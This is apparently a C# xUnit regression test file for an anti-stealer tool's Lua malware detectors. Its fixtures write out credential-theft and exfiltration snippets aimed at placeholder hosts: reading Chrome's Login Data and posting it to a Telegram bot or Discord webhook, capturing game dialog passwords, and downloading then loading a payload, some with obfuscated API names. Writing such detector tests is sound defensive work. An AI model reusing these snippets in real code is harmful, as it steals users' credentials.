using System.Linq;
using System.Text;
using AntiStealerOneExe;
using Xunit;

namespace AntiStealer.Tests;

/// <summary>
/// L1...L15 — Lua professional detector pipeline regression tests.
/// </summary>
public class LuaDetectorsTests
{
    private static AnalysisResult RunOnLua(string luaSource)
    {
        var r = new AnalysisResult("/synthetic/test.lua")
        {
            FormatFamily = "Script-LUA",
            FileType = "Script-LUA script",
        };
        var bytes = Encoding.UTF8.GetBytes(luaSource);
        LuaDetectors.Run(r, bytes);
        return r;
    }

    [Fact]
    public void L1_FactEngine_PopulatesSeparateLists()
    {
        var src = @"
            local h = require('socket.http')
            h.request('http://example.invalid')
            sampGetCurrentServerPassword()
            io.open([[C:\Users\v\AppData\Local\Google\Chrome\User Data\Default\Login Data]], 'rb')
        ";
        var r = RunOnLua(src);
        Assert.NotEmpty(r.LuaIndicators);
        Assert.NotEmpty(r.LuaSampHits);
        Assert.NotEmpty(r.LuaExfilHits);
        Assert.NotEmpty(r.LuaCredentialHits);
    }

    [Fact]
    public void L2_ConcatFold_DecodesLoadLibrary()
    {
        var src = "local fn = \"Load\" .. \"LibraryA\"";
        var r = RunOnLua(src);
        Assert.Contains(r.LuaObfuscationHits, h => h == "lua:deob:concat-fold");
        Assert.Contains(r.LuaLoaderHits, h => h.Contains("LoadLibraryA"));
    }

    [Fact]
    public void L2_StringChar_DecodesGetProcAddress()
    {
        // GetProcAddress => 71,101,116,80,114,111,99,65,100,100,114,101,115,115
        var src = "local x = string.char(71,101,116,80,114,111,99,65,100,100,114,101,115,115)";
        var r = RunOnLua(src);
        Assert.Contains(r.LuaObfuscationHits, h => h == "lua:deob:string-char");
        Assert.Contains(r.LuaLoaderHits, h => h.Contains("GetProcAddress"));
    }

    [Fact]
    public void L2_HexEscape_AndDecimalEscape_AreDecoded()
    {
        // \x4c\x6f\x61\x64 = "Load", \76\111\97\100\76\105\98\114\97\114\121\65 = LoadLibraryA
        var src = "local a = \"\\x4c\\x6f\\x61\\x64\"; local b = \"\\76\\111\\97\\100\\76\\105\\98\\114\\97\\114\\121\\65\"";
        var r = RunOnLua(src);
        Assert.Contains(r.LuaObfuscationHits, h => h == "lua:deob:hex-escape");
        Assert.Contains(r.LuaObfuscationHits, h => h == "lua:deob:decimal-escape");
        Assert.Contains(r.LuaLoaderHits, h => h.Contains("LoadLibraryA"));
    }

    [Fact]
    public void L3_LuaBytecode_MagicDetected_AndFormatFamilyUpgraded()
    {
        var bytes = new byte[] { 0x1B, (byte)'L', (byte)'u', (byte)'a',
                                 0x53, 0x00, 0x01, 0x04, 0x04,
                                 // padding
                                 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 };
        var r = new AnalysisResult("/synthetic/test.luac")
        {
            FormatFamily = "Script-LUA",
        };
        LuaDetectors.Run(r, bytes);
        Assert.True(r.LuaIsBytecode);
        Assert.Equal("Lua-Bytecode", r.FormatFamily);
        Assert.Contains(r.LuaIndicators, h => h == "lua:bytecode");
    }

    [Fact]
    public void L4_SampHooks_AreClassifiedAsSampHits()
    {
        var src = @"
            sampRegisterChatCommand('hello', function() end)
            sampGetPlayerNickname(playerId)
            sampGetCurrentServerAddress()
            sampGetCurrentServerPassword()
            sampSendChat('hi')
        ";
        var r = RunOnLua(src);
        Assert.Contains(r.LuaSampHits, h => h.Contains("samp-chatcmd"));
        Assert.Contains(r.LuaSampHits, h => h.Contains("samp-nickname"));
        Assert.Contains(r.LuaSampHits, h => h.Contains("samp-server-addr"));
        Assert.Contains(r.LuaSampHits, h => h.Contains("samp-server-pwd"));
    }

    [Fact]
    public void L5_MoonloaderDialogPasswordWebhook_ProducesChain()
    {
        var src = @"
            local sampev = require 'lib.samp.events'
            function sampev.onSendDialogResponse(dialogId, button, listboxId, input)
                local password = input
                local body = 'password=' .. password
                requestHTTP('POST', 'https://discord.com/api/webhooks/123/abc', body, function() end)
            end
        ";
        var r = RunOnLua(src);
        Assert.Contains(r.LuaSampHits, h => h.Contains("moonloader-dlg-response"));
        Assert.Contains(r.LuaSampHits, h => h == "lua:chain:samp-dialog-cred-exfil");
    }

    [Fact]
    public void L6_HttpSinks_AreClassifiedAsExfilHits()
    {
        var src = @"
            local http = require('socket.http')
            http.request('http://example.invalid')
            asyncHttpRequest('GET', 'http://example.invalid', '', function() end)
        ";
        var r = RunOnLua(src);
        Assert.Contains(r.LuaExfilHits, h => h.Contains("socket-http"));
        Assert.Contains(r.LuaExfilHits, h => h.Contains("http-request"));
    }

    [Fact]
    public void L7_FileTheft_ChromeLoginData_PopulatesCredentialHits()
    {
        var src = @"
            local f = io.open([[C:\Users\v\AppData\Local\Google\Chrome\User Data\Default\Login Data]], 'rb')
            local body = f:read('*a')
            f:close()
        ";
        var r = RunOnLua(src);
        Assert.Contains(r.LuaCredentialHits, h => h.StartsWith("lua:file:io.open"));
        Assert.Contains(r.LuaCredentialHits, h => h.Contains("Login Data"));
        Assert.Contains(r.LuaCredentialHits, h => h.Contains("Chrome\\User Data"));
    }

    [Fact]
    public void L8_DownloadPlusLoad_ChainTriggers()
    {
        var src = @"
            downloadUrlToFile('http://example.invalid/payload.asi', './payload.asi')
            loadDynamicLibrary('./payload.asi')
        ";
        var r = RunOnLua(src);
        Assert.True(r.LuaDownloadAndLoadChain);
        Assert.Contains(r.LuaLoaderHits, h => h == "lua:chain:download-and-load");
    }

    [Fact]
    public void L9_CredentialReadPlusTelegramExfil_ChainTriggers()
    {
        var src = @"
            local f = io.open([[C:\Users\v\AppData\Local\Google\Chrome\User Data\Default\Login Data]], 'rb')
            local body = f:read('*a')
            f:close()
            requestHTTP('POST', 'https://api.telegram.org/bot7777:AAA/sendDocument', body, function() end)
        ";
        var r = RunOnLua(src);
        Assert.True(r.LuaCredentialExfilChain);
        Assert.Contains(r.LuaExfilHits, h => h == "lua:chain:cred-read-and-exfil");
    }

    [Fact]
    public void L11_WindowsApiNames_StayCaseSensitive()
    {
        // 'loadlibrarya' lowercase MUST NOT be flagged as the WinAPI
        // name. Lua tokens like 'loadDynamicLibrary' are matched
        // case-insensitively.
        var lower = RunOnLua("local x = 'loadlibrarya'");
        Assert.DoesNotContain(lower.LuaLoaderHits, h => h == "lua:winapi:LoadLibraryA");

        var upper = RunOnLua("local x = 'LoadLibraryA'");
        Assert.Contains(upper.LuaLoaderHits, h => h == "lua:winapi:LoadLibraryA");
    }

    [Fact]
    public void L12_FfiPlusLoadLibrary_TriggersLoaderChain()
    {
        var src = @"
            local ffi = require 'ffi'
            ffi.cdef[[ void* LoadLibraryA(const char*); ]]
            local k32 = ffi.load('kernel32')
            local handle = k32.LoadLibraryA('payload.dll')
        ";
        var r = RunOnLua(src);
        Assert.Contains(r.LuaRequireHits, h => h.Contains("ffi"));
        Assert.Contains(r.LuaLoaderHits, h => h == "lua:chain:ffi-loadlibrary");
    }

    [Fact]
    public void L13_RobloxSetClipboardPlusWebhook_TriggersChain()
    {
        var src = @"
            local data = game:HttpGet('http://example.invalid/probe')
            setclipboard('bot-token-here')
            local res = request({Url='https://discord.com/api/webhooks/123/abc', Method='POST'})
        ";
        var r = RunOnLua(src);
        Assert.Contains(r.LuaRobloxHits, h => h == "luau:setclipboard");
        Assert.Contains(r.LuaRobloxHits, h => h == "luau:chain:setclipboard-token-webhook");
    }

    [Fact]
    public void L14_CommentsOnly_DoesNotFireLoaderChain()
    {
        var src = @"
            -- documentation: downloadUrlToFile('http://example.invalid/payload.asi', './payload.asi')
            -- documentation: loadDynamicLibrary('./payload.asi')
            --[[
                another block comment mentioning sampGetCurrentServerPassword
            ]]
            print('hello world')
        ";
        var r = RunOnLua(src);
        // Comments should be stripped before generic indicator scans,
        // so neither chain marker should be set.
        Assert.False(r.LuaDownloadAndLoadChain,
            "Comment-only mentions must not trigger the download+load chain");
        Assert.False(r.LuaCredentialExfilChain,
            "Comment-only mentions must not trigger the cred-exfil chain");
    }

    [Fact]
    public void L15_ContextWindow_FarApart_DoesNotTriggerExfilChain()
    {
        // io.open + Login Data near the top, then 12 KiB of filler,
        // then a Telegram exfil URL — must NOT be classified as the
        // cred-exfil chain (outside the 8 KiB context window).
        var filler = new string('A', 12 * 1024);
        var src =
            @"local f = io.open([[C:\Users\v\AppData\Local\Google\Chrome\User Data\Default\Login Data]], 'rb')" +
            "\n" + filler + "\n" +
            "requestHTTP('POST', 'https://api.telegram.org/bot7777:AAA/sendDocument', '', function() end)";
        var r = RunOnLua(src);
        Assert.False(r.LuaCredentialExfilChain,
            "Cred-read and exfil more than 8 KiB apart must not trigger the chain");
    }

    [Fact]
    public void L11_LuaTokens_AreCaseInsensitive()
    {
        var src = @"
            LoadStringCustom('print(1)')
            loadstring('print(1)')
            LOADSTRING('print(1)')
        ";
        var r = RunOnLua(src);
        Assert.Contains(r.LuaIndicators, h => h == "lua:loadstring");
    }

    [Fact]
    public void L8_DownloadWithoutLoad_DoesNotFireChain()
    {
        var src = @"
            local body = http.request('http://example.invalid/file.asi')
            -- just a download, no load primitive
        ";
        var r = RunOnLua(src);
        Assert.False(r.LuaDownloadAndLoadChain);
    }
}
